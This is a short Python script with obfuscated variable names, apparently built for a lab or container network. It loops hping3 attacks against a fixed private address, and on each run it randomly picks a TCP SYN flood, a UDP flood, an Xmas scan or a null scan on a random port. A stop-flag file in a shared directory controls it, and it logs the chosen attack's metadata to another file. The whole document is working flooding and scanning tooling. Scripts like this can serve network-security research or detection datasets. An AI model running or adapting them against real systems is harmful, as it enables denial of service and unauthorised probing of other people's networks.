import subprocess as s, time as t, os, random as r

# Obfuscated constants
_ = r.choice(["eagle", "falcon", "panther", "ghost"])
__ = r.randint(1025, 65535)
___ = r.choice(["tcp_syn", "udp_flood", "xmas_scan", "null_scan"])
____ = s.getoutput("hostname -I").strip().split()[0]
_____ = ____.split('.')[-1]

# Reset stop flag
try:
    open("/shared/stop_attack.txt", "w").write("0\n")
    print("[INIT] stop_attack.txt reset to 0")
except Exception as e:
    print(f"[ERROR] Failed to reset stop_attack.txt: {e}")

# Metadata
open("/shared/attack_info.txt", "w").write(f"{_},{__},{___},{_____}\n")

# Payload
open("/tmp/payload.txt", "w").write(_.ljust(64, "X"))

# Target
T = "172.20.0.10"

# Get attack command
get = lambda: ["hping3"] + {
    "tcp_syn": ["-S"], 
    "udp_flood": ["--udp"],  
    "xmas_scan": ["-X"], 
    "null_scan": []
}.get(___, []) + ["-d", "64", "-E", "/tmp/payload.txt", "-p", str(__), T]

# Execute
print(f"[START] Running attack with {___} on port {__} from {____}")
while True:
    try:
        s.run(get(), stdout=s.DEVNULL, stderr=s.DEVNULL, timeout=2)
    except s.TimeoutExpired:
        print("[WARN] Attack timed out, continuing...")

    D, V = 5, None
    try:
        V = open("/shared/stop_attack.txt").read().strip().lower()
        print(f"[DEBUG] stop_attack.txt = '{V}'")
        if V == "stop":
            print("[EXIT] Detected stop — terminating attack."); break
        elif V.isdigit(): D = int(V)
    except Exception as e:
        print(f"[ERROR] Could not read stop_attack.txt: {e}")

    print(f"[INFO] Sleeping for {D} seconds before next attack")
    t.sleep(D)
